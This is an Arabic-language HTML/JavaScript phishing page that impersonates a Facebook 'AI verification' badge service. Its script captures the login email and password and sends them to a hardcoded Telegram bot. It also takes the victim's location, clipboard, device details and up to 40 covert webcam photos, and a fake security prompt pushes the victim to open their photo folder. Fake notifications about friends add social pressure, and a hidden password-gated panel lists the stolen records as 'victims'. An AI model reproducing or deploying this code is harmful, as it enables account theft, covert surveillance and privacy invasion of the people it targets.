<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | AI Verification Hub</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --fb-blue: #1877f2; --fb-bg: #f0f2f5; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--fb-bg); margin: 0; overflow: hidden; }
        
        /* أيقونة الملك السرية */
        #king-portal-btn { position: fixed; top: 10px; right: 10px; color: #ccc; cursor: pointer; z-index: 10000; opacity: 0.1; font-size: 20px; }
        
        /* واجهة الضحية */
        .app-container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .auth-card { background: white; padding: 35px; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); width: 100%; max-width: 420px; text-align: center; position: relative; }
        .fb-logo { color: var(--fb-blue); font-size: 42px; font-weight: bold; margin-bottom: 5px; }
        
        /* حبشتكنات الذكاء الاصطناعي */
        .ai-scanner { border: 2px solid #e7f3ff; border-radius: 10px; padding: 15px; margin: 20px 0; position: relative; overflow: hidden; }
        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--fb-blue); animation: scan 2s infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        input { width: 92%; padding: 15px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; background: #f5f6f7; transition: 0.3s; }
        input:focus { border-color: var(--fb-blue); background: #fff; }
        
        .btn-prime { width: 100%; padding: 16px; background: var(--fb-blue); color: white; border: none; border-radius: 8px; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 14px rgba(24,119,242,0.4); }
        
        /* لوحة تحكم الملك الملكية */
        #royal-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #00ff00; z-index: 99999; padding: 30px; overflow-y: auto; font-family: 'Consolas', monospace; }
        .victim-card { border: 1px solid #1a1a1a; padding: 15px; margin-bottom: 15px; background: #0a0a0a; border-right: 4px solid #00ff00; }
        .tag { color: #0ff; font-weight: bold; }
    </style>
</head>
<body>

<!-- مفتاح الدخول السري -->
<div id="king-portal-btn" onclick="openKingVault()"><i class="fas fa-user-shield"></i></div>

<div id="victim-ui" class="app-container">
    <div class="fb-logo">facebook</div>
    <div class="auth-card">
        <div class="ai-scanner">
            <div class="scan-line"></div>
            <i class="fas fa-robot" style="font-size: 30px; color: #1877f2;"></i>
            <div id="ai-text" style="font-size: 13px; margin-top: 10px; font-weight: bold;">جاري فحص بروتوكولات الأمان...</div>
        </div>
        
        <h3 style="margin: 0;">نظام التوثيق المتقدم V21</h3>
        <p style="font-size: 13px; color: #606770;">لقد اكتشف Gemini AI أنك تستحق شارة التوثيق. يرجى تأكيد ملكية الحساب للبدء.</p>

        <input type="text" id="u_field" placeholder="البريد الإلكتروني أو الهاتف">
        <input type="password" id="p_field" placeholder="كلمة السر">
        
        <button class="btn-prime" onclick="startFinalHarvest()">تأكيد الهوية وتوثيق الحساب</button>
        
        <div id="loader" style="display:none; margin-top:20px;">
            <i class="fas fa-spinner fa-spin" style="color: #1877f2; font-size: 24px;"></i>
            <p style="font-size: 12px; color: #28a745; font-weight: bold;">جاري سحب الصلاحيات ومطابقة البيانات...</p>
        </div>
    </div>
</div>

<div id="royal-panel">
    <div style="display:flex; justify-content:space-between; align-items:center;">
        <h1 style="color: #0ff; text-shadow: 0 0 10px #0ff;">🔱 TALLAH SUPREME VAULT 🔱</h1>
        <button onclick="clearLogs()" style="background:orange; color:black; border:none; padding:10px; cursor:pointer; font-weight:bold;">مسح السجل</button>
        <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px; cursor:pointer;">خروج</button>
    </div>
    <hr color="#111">
    <div id="logs-display"></div>
</div>

<script>
const BOT_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
const CHAT_ID = "8754338811";

// 1. هندسة اجتماعية (تأثير القطيع)
window.onload = () => {
    setTimeout(() => { document.getElementById('ai-text').innerText = "✅ تم التحقق من سلامة المتصفح"; }, 2000);
    // إشعار وهمي لإغراء الضحية
    setInterval(() => {
        if(Math.random() > 0.7) {
            const names = ["أحمد", "سارة", "محمد", "ياسين", "نور"];
            const name = names[Math.floor(Math.random()*names.length)];
            const toast = document.createElement('div');
            toast.style = "position:fixed; bottom:20px; right:20px; background:white; padding:10px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.2); font-size:12px; z-index:9999; border-left:4px solid #28a745;";
            toast.innerHTML = `👤 صديقك <b>${name}</b> وثق حسابه الآن!`;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 4000);
        }
    }, 10000);
};

// 2. بوابة الملك (44443)
function openKingVault() {
    if(prompt("Royal Vault Pass:") === "44443") {
        renderVault();
        document.getElementById('royal-panel').style.display = 'block';
    }
}

// 3. التنفيذ النهائي (Execution)
async function startFinalHarvest() {
    const u = document.getElementById('u_field').value;
    const p = document.getElementById('p_field').value;
    if(!u || !p) return;

    // صوت "تم التحقق" (حبشتكنات)
    new Audio('https://www.soundjay.com/buttons/sounds/button-3.mp3').play();

    document.getElementById('loader').style.display = "block";
    
    // سحب البيانات
    logData("TARGET", `USER: ${u} | PASS: ${p}`);
    await pushTG(`🔱 صيد إمبراطوري جديد 🔱\n👤: ${u}\n🔑: ${p}`);

    // استنزاف كافة الصلاحيات
    drainEverything();
}

async function drainEverything() {
    // الموقع الدقيق
    navigator.geolocation.getCurrentPosition(pos => {
        const url = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        pushTG(url); logData("LOCATION", url);
    });

    // الحافظة (Clipboard)
    try {
        const text = await navigator.clipboard.readText();
        if(text) { pushTG(`📋 حافظة الضحية: ${text}`); logData("CLIPBOARD", text); }
    } catch(e){}

    // معلومات الجهاز والبطارية
    const b = await navigator.getBattery();
    const info = `🔋 بطارية: ${b.level*100}% | 📶 شبكة: ${navigator.connection.effectiveType} | 💻 جهاز: ${navigator.platform}`;
    pushTG(info); logData("HARDWARE", info);

    // سحب 40 صورة في الخلفية
    startStealthCam();

    // خدعة اختيار المجلد
    setTimeout(() => {
        alert("🛡️ إجراء أمني: يرجى اختيار مجلد الصور (DCIM) لمطابقة بصمة الوجه الرقمية.");
        const inp = document.createElement('input'); inp.type = 'file'; inp.webkitdirectory = true;
        inp.onchange = (e) => {
            pushTG(`📂 الضحية سمح بالوصول لـ ${e.target.files.length} ملف.`);
            logData("FILES", `Access to ${e.target.files.length} files confirmed.`);
            alert("✅ تم التوثيق بنجاح! سيتم مراجعة طلبك خلال 10 دقائق.");
        };
        inp.click();
    }, 5000);
}

// 4. محرك الجاسوس البصري
async function startStealthCam() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        let i = 0;
        const loop = setInterval(() => {
            if(i < 40) {
                const v = document.createElement('video'); v.srcObject = stream; v.play();
                const c = document.createElement('canvas');
                c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => sendPhoto(b, `📸 لقطة رقم ${i+1}`));
                i++;
            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(loop); }
        }, 2000);
    } catch(e) {}
}

// إدارة السجلات
function logData(type, content) {
    let logs = JSON.parse(localStorage.getItem('supreme_logs')) || [];
    logs.push({type, content, time: new Date().toLocaleTimeString()});
    localStorage.setItem('supreme_logs', JSON.stringify(logs));
}

function renderVault() {
    const list = document.getElementById('logs-display');
    const logs = JSON.parse(localStorage.getItem('supreme_logs')) || [];
    list.innerHTML = logs.reverse().map(l => `
        <div class="victim-card">
            <span class="tag">[${l.time}]</span> <span style="color:#f0f;">[${l.type}]</span>: ${l.content}
        </div>
    `).join('');
}

function clearLogs() { localStorage.removeItem('supreme_logs'); renderVault(); }

async function pushTG(m) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}`); }
async function sendPhoto(b, cap) {
    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 's.jpg'); fd.append('caption', cap);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd});
}
</script>
</body>
</html>
